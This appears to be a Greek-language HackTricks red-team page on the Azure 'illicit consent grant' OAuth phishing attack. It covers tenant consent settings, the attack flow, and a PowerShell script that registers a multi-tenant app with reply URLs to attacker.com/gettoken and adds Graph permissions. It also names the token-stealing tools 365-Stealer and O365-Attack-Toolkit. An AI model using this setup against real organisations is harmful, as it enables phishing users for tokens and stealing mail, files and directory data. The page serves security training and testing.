# Az - Illicit Consent Grant

{% hint style="success" %}
Μάθετε και εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Μάθετε και εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Γίνετε μέλος της** 💬 [**ομάδας Discord**](https://discord.gg/hRep4RUj7f) ή της [**ομάδας telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε hacking tricks υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο github.

</details>
{% endhint %}

## OAuth App Phishing

Οι **Azure Applications** ζητούν άδειες για πρόσβαση στα **δεδομένα χρήστη** (βασικές πληροφορίες, αλλά και πρόσβαση σε έγγραφα, αποστολή email...).\
Αν **επιτραπεί**, ένας κανονικός χρήστης μπορεί να δώσει συγκατάθεση μόνο για **"Low Impact" άδειες**. Σε **όλες τις άλλες** περιπτώσεις, **απαιτείται συγκατάθεση διαχειριστή**.\
`GA`, `ApplicationAdministrator`, `CloudApplication` `Administrator` και ένας προσαρμοσμένος ρόλος που περιλαμβάνει `άδεια να δίνει άδειες σε εφαρμογές` μπορούν να παρέχουν συγκατάθεση σε επίπεδο ενοικιαστή.

Μόνο οι άδειες που **δεν απαιτούν συγκατάθεση διαχειριστή** ταξινομούνται ως **χαμηλής επίδρασης**. Αυτές είναι οι άδειες που απαιτούνται για **βασική σύνδεση είναι openid, profile, email, User.Read και offline\_access**. Αν ένας **οργανισμός** **επιτρέπει** τη συγκατάθεση χρήστη για **όλες τις εφαρμογές**, ένας υπάλληλος μπορεί να δώσει συγκατάθεση σε μια εφαρμογή να **διαβάσει τα παραπάνω από το προφίλ του**.

<figure><img src="../../../.gitbook/assets/image (141).png" alt=""><figcaption></figcaption></figure>

Επομένως, ένας επιτιθέμενος θα μπορούσε να προετοιμάσει μια **κακόβουλη Εφαρμογή** και με ένα **phishing**, να κάνει τον χρήστη να **αποδεχτεί την Εφαρμογή και να κλέψει τα δεδομένα του**.

### 2 Τύποι Επιθέσεων Illicit Consent Grant

* **Unauthenticated**: Από έναν εξωτερικό λογαριασμό δημιουργήστε μια εφαρμογή με τις άδειες `User.Read` και `User.ReadBasic.All` για παράδειγμα, κάντε phishing σε έναν χρήστη, και θα μπορείτε να έχετε πρόσβαση σε πληροφορίες καταλόγου.
* Αυτό απαιτεί ο χρήστης που έγινε phishing να μπορεί να αποδεχτεί OAuth εφαρμογές από εξωτερικά περιβάλλοντα!
* **Authenticated**: Έχοντας παραβιάσει έναν κύριο με αρκετά προνόμια, δημιουργήστε μια εφαρμογή μέσα στον λογαριασμό και κάντε phishing σε κάποιον προνομιούχο χρήστη που μπορεί να αποδεχτεί προνομιούχες OAuth άδειες.
* Σε αυτή την περίπτωση μπορείτε ήδη να έχετε πρόσβαση στις πληροφορίες του καταλόγου, οπότε η άδεια `User.ReadBasic.All` δεν είναι πλέον ενδιαφέρουσα.
* Πιθανότατα σας ενδιαφέρουν **άδειες που απαιτούν διαχειριστή για να τις δώσει**, επειδή ο απλός χρήστης δεν μπορεί να δώσει σε OAuth εφαρμογές καμία άδεια, γι' αυτό πρέπει να **κάνετε phishing μόνο σε αυτούς τους χρήστες** (περισσότερα για το ποιες ρόλοι/άδειες δίνουν αυτό το προνόμιο αργότερα)

### Έλεγχος αν οι χρήστες επιτρέπεται να δώσουν συγκατάθεση

Η ακόλουθη εντολή PowerShell χρησιμοποιείται για να ελέγξει τη διαμόρφωση συγκατάθεσης για τους χρήστες στο Azure Active Directory (Azure AD) σχετικά με την ικανότητά τους να δώσουν συγκατάθεση σε εφαρμογές:
```powershell
PS AzureADPreview> (GetAzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
```
* **Απενεργοποίηση συγκατάθεσης χρήστη**: Αυτή η ρύθμιση απαγορεύει στους χρήστες να δίνουν άδειες σε εφαρμογές. Δεν επιτρέπεται καμία συγκατάθεση χρήστη σε εφαρμογές.
* **Οι χρήστες μπορούν να δώσουν συγκατάθεση σε εφαρμογές από επαληθευμένους εκδότες ή την οργάνωσή σας, αλλά μόνο για άδειες που επιλέγετε**: Αυτή η ρύθμιση επιτρέπει σε όλους τους χρήστες να δώσουν συγκατάθεση μόνο σε εφαρμογές που δημοσιεύονται από επαληθευμένο εκδότη και εφαρμογές που είναι καταχωρημένες στον δικό σας tenant. Προσθέτει ένα επίπεδο ελέγχου επιτρέποντας συγκατάθεση μόνο για συγκεκριμένες άδειες.
* **Οι χρήστες μπορούν να δώσουν συγκατάθεση σε όλες τις εφαρμογές**: Αυτή η ρύθμιση είναι πιο επιτρεπτική και επιτρέπει σε όλους τους χρήστες να δώσουν συγκατάθεση για οποιεσδήποτε άδειες για εφαρμογές, αρκεί αυτές οι άδειες να μην απαιτούν συγκατάθεση διαχειριστή.
* **Προσαρμοσμένη πολιτική συγκατάθεσης εφαρμογών**: Αυτή η ρύθμιση υποδεικνύει ότι υπάρχει μια προσαρμοσμένη πολιτική, η οποία μπορεί να προσαρμοστεί σε συγκεκριμένες απαιτήσεις της οργάνωσης και μπορεί να περιλαμβάνει έναν συνδυασμό περιορισμών βάσει του εκδότη της εφαρμογής, των αδειών που ζητά η εφαρμογή και άλλων παραγόντων.

## **Κατανόηση της Επίθεσης Παράνομης Συγκατάθεσης**

Σε μια επίθεση παράνομης συγκατάθεσης, οι επιτιθέμενοι εξαπατούν τους τελικούς χρήστες να δώσουν άδειες σε μια κακόβουλη εφαρμογή καταχωρημένη στο Azure. Αυτό γίνεται κάνοντας την εφαρμογή να φαίνεται νόμιμη, οδηγώντας τα θύματα να κάνουν κλικ στο κουμπί "Αποδοχή" χωρίς να το καταλάβουν. Ως αποτέλεσμα, το Azure AD εκδίδει ένα token στον ιστότοπο του επιτιθέμενου, επιτρέποντάς του να έχει πρόσβαση και να χειρίζεται τα δεδομένα του θύματος, όπως να διαβάζει ή να στέλνει email και να έχει πρόσβαση σε αρχεία, χωρίς να χρειάζεται λογαριασμό της οργάνωσης.

## **Επισκόπηση Ροής Επίθεσης**

Η επίθεση περιλαμβάνει διάφορα βήματα που στοχεύουν μια γενική εταιρεία. Να πώς μπορεί να εξελιχθεί:

1. **Καταχώρηση Domain και Φιλοξενία Εφαρμογής**: Ο επιτιθέμενος καταχωρεί ένα domain που μοιάζει με αξιόπιστο ιστότοπο, για παράδειγμα, "safedomainlogin.com". Κάτω από αυτό το domain, δημιουργείται ένα υποτομέας (π.χ., "companyname.safedomainlogin.com") για να φιλοξενήσει μια εφαρμογή σχεδιασμένη να καταγράφει κωδικούς εξουσιοδότησης και να ζητά tokens πρόσβασης.
2. **Καταχώρηση Εφαρμογής στο Azure AD**: Ο επιτιθέμενος στη συνέχεια καταχωρεί μια Multi-Tenant Application στο δικό του Azure AD Tenant, ονομάζοντάς την με το όνομα της στοχευμένης εταιρείας για να φαίνεται νόμιμη. Ρυθμίζουν το Redirect URL της εφαρμογής να δείχνει στον υποτομέα που φιλοξενεί την κακόβουλη εφαρμογή.
3. **Ρύθμιση Αδειών**: Ο επιτιθέμενος ρυθμίζει την εφαρμογή με διάφορες API άδειες (π.χ., `Mail.Read`, `Notes.Read.All`, `Files.ReadWrite.All`, `User.ReadBasic.All`, `User.Read`). Αυτές οι άδειες, μόλις δοθούν από τον χρήστη, επιτρέπουν στον επιτιθέμενο να εξάγει ευαίσθητες πληροφορίες εκ μέρους του χρήστη.
4. **Διανομή Κακόβουλων Συνδέσμων**: Ο επιτιθέμενος δημιουργεί έναν σύνδεσμο που περιέχει το client id της κακόβουλης εφαρμογής και τον μοιράζεται με στοχευμένους χρήστες, εξαπατώντας τους να δώσουν συγκατάθεση.

## **Χρήση Εργαλείων για την Επίθεση**

Η επίθεση μπορεί να διευκολυνθεί χρησιμοποιώντας εργαλεία όπως [**365-Stealer**](https://github.com/AlteredSecurity/365-Stealer).

### Προετοιμασία Πριν την Επίθεση:

Εάν ο επιτιθέμενος έχει κάποιο επίπεδο πρόσβασης σε έναν χρήστη στην οργάνωση του θύματος, μπορεί να ελέγξει αν η πολιτική της οργάνωσης επιτρέπει στον χρήστη να αποδεχτεί εφαρμογές:
```powershell
Import-Module .\AzureADPreview\AzureADPreview.psd1
$passwd = ConvertTo-SecureString "Password!" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("generic@corp.onmicrosoft.com", $passwd)
Connect-AzureAD -Credential $creds
(Get-AzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
# Check if "ManagePermissionGrantsForSelf.microsoft-user-default-legacy" is present, indicating permission to accept apps.
```
Για την εκτέλεση της επίθεσης, ο επιτιθέμενος θα χρειαστεί να δημιουργήσει μια **νέα Εφαρμογή στον Azure Tenant τους** (στις Εγγραφές Εφαρμογών), διαμορφωμένη με τις εξής άδειες:

<figure><img src="../../../.gitbook/assets/image (87).png" alt=""><figcaption></figcaption></figure>

`User.ReadBasic.All` είναι μέσα στο `Microsoft Graph` στις `Delegated permissions`. (Οι Application permissions θα χρειάζονται πάντα επιπλέον έγκριση).

* `User.ReadBasic.All` είναι η άδεια που θα σας επιτρέψει να **διαβάσετε πληροφορίες όλων των χρηστών** στον οργανισμό αν εγκριθεί.
* Θυμηθείτε ότι μόνο οι `GA`, `ApplicationAdministrator`, `CloudApplication` `Administrator` και ένας προσαρμοσμένος ρόλος που περιλαμβάνει `άδεια για την παραχώρηση αδειών σε εφαρμογές` μπορούν να παρέχουν έγκριση σε επίπεδο tenant. Έτσι, θα πρέπει να **ψαρέψετε έναν χρήστη με έναν από αυτούς τους ρόλους** αν θέλετε να εγκρίνει μια **Εφαρμογή που απαιτεί έγκριση διαχειριστή**.

Μπορείτε επίσης να δημιουργήσετε μια Εφαρμογή μέσω cli με: 

{% code overflow="wrap" %}
```bash
# Generate Application
New-AzureADApplication -DisplayName "MyApp"  -ReplyUrls @("https://attacker.com", "https://attacker.com/gettoken") -Oauth2AllowImplicitFlow $true -AvailableToOtherTenants $true

# Generate Secret
New-AzureADApplicationPasswordCredential -ObjectId f76ebd35-xxxx-xxxx-xxxx-xxxxxxxxxxxx -CustomKeyIdentifier "MyAppSecret" -StartDate (Get-Date) -EndDate (Get-Date).AddYears(3)

# Generate an application with the permissions
$objectid=New-AzureADApplication -DisplayName "AppName"  -ReplyUrls @("https://example.com/login/authorized") -Oauth2AllowImplicitFlow $true -AvailableToOtherTenants $true | select-object ObjectId
New-AzureADApplicationPasswordCredential -ObjectId $objectid.ObjectId -CustomKeyIdentifier "secret" -StartDate (Get-Date) -EndDate (Get-Date).AddYears(3)

$AppObjectID = $objectid.ObjectId # object id in AD
$app = Get-AzureADApplication -ObjectId $AppObjectID
$AADAccess = $app.RequiredResourceAccess | Where-Object {$_.ResourceAppId -eq "00000003-0000-0000-c000-000000000000"}  # "00000003-0000-0000-c000-000000000000" represents Graph API
if($AADAccess -eq $null) {
$AADAccess = New-Object Microsoft.Open.AzureAD.Model.RequiredResourceAccess
$AADAccess.ResourceAppId = "00000003-0000-0000-c000-000000000000"

$Access = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access.Type = "Scope"
$Access.Id = "14dad69e-099b-42c9-810b-d002981feec1"
$AADAccess.ResourceAccess = @()
$AADAccess.ResourceAccess.Add($Access)

$Access2 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access2.Type = "Scope"
$Access2.Id = "e1fe6dd8-ba31-4d61-89e7-88639da4683d"
$AADAccess.ResourceAccess.Add($Access2)

$Access3 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access3.Type = "Scope"
$Access3.Id = "df85f4d6-205c-4ac5-a5ea-6bf408dba283"
$AADAccess.ResourceAccess.Add($Access3)

$Access4 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access4.Type = "Scope"
$Access4.Id = "10465720-29dd-4523-a11a-6a75c743c9d9"
$AADAccess.ResourceAccess.Add($Access4)

$app.RequiredResourceAccess.Add($AADAccess)
} else {
$Access = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access.Type = "Scope"
$Access.Id = "14dad69e-099b-42c9-810b-d002981feec1"
$AADAccess.ResourceAccess = @()
$AADAccess.ResourceAccess.Add($Access)

$Access2 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access2.Type = "Scope"
$Access2.Id = "e1fe6dd8-ba31-4d61-89e7-88639da4683d"
$AADAccess.ResourceAccess.Add($Access2)

$Access3 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access3.Type = "Scope"
$Access3.Id = "df85f4d6-205c-4ac5-a5ea-6bf408dba283"
$AADAccess.ResourceAccess.Add($Access3)

$Access4 = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess
$Access4.Type = "Scope"
$Access4.Id = "10465720-29dd-4523-a11a-6a75c743c9d9"
$AADAccess.ResourceAccess.Add($Access4)
}

Set-AzureADApplication -ObjectId $AppObjectID -RequiredResourceAccess $app.RequiredResourceAccess
Get-AzureADApplication -ObjectId $objectid.ObjectId | select-object appid
```
{% endcode %}

Check [https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer) to learn how to configure it.

{% hint style="warning" %}
Σημειώστε ότι το αποκτηθέν **access token** θα είναι για το **graph endpoint** με τα scopes: `User.Read` και `User.ReadBasic.All` (οι ζητούμενες άδειες). Δεν θα μπορείτε να εκτελέσετε άλλες ενέργειες (αλλά αυτές είναι αρκετές για να **κατεβάσετε πληροφορίες για όλους τους χρήστες** στον οργανισμό).
{% endhint %}

## [O365-Attack-Toolkit](https://github.com/mdsecactivebreach/o365-attack-toolkit)

Μπορείτε επίσης να χρησιμοποιήσετε αυτό το εργαλείο για να εκτελέσετε αυτήν την επίθεση.

## Post-Exploitation

Μόλις αποκτήσετε πρόσβαση στον χρήστη, μπορείτε να κάνετε πράγματα όπως να κλέψετε ευαίσθητα έγγραφα και ακόμη και να ανεβάσετε αρχεία εγγράφων με backdoor.

## References

* [https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer)
* [https://swisskyrepo.github.io/InternalAllTheThings/cloud/azure/azure-phishing/](https://swisskyrepo.github.io/InternalAllTheThings/cloud/azure/azure-phishing/)

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Δείτε τα [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε hacking tricks υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
